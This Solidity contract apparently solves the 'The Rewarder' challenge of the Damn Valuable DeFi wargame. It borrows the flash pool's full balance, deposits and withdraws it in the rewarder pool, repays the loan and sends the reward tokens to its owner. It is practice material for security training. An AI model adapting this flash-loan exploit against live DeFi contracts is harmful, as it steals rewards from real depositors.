// SPDX-License-Identifier: MIT
import "@openzeppelin/contracts/access/Ownable.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";

pragma solidity ^0.8.0;

interface IRewarderPool {
    // only necessary functions
    function rewardToken() external view returns (address);

    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashLoan {
    // only necessary functions
    function liquidityToken() external view returns (address);

    function flashLoan(uint256 amount) external;
}

contract ExploitTheRewarder is Ownable {
    IRewarderPool private target;
    IFlashLoan private flashPool;
    DamnValuableToken private liquidityToken;
    RewardToken private rewardToken;

    constructor(address _target, address _flashPool) {
        target = IRewarderPool(_target);
        flashPool = IFlashLoan(_flashPool);
        liquidityToken = DamnValuableToken(address(flashPool.liquidityToken()));
        rewardToken = RewardToken(address(target.rewardToken()));
    }

    function execute() public onlyOwner {
        // trigger flashloan
        uint256 maxAmount = liquidityToken.balanceOf(address(flashPool));
        flashPool.flashLoan(maxAmount);
    }

    function receiveFlashLoan(uint256 amount) public {
        // execute exploit with flashloan
        require(
            msg.sender == address(flashPool),
            "EXPLOIT_THE_REWARDER: Only callable by flashloan"
        );

        liquidityToken.approve(address(target), amount);
        target.deposit(amount);
        target.withdraw(amount);

        liquidityToken.transfer(address(flashPool), amount);

        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner(), rewardBalance);
    }
}
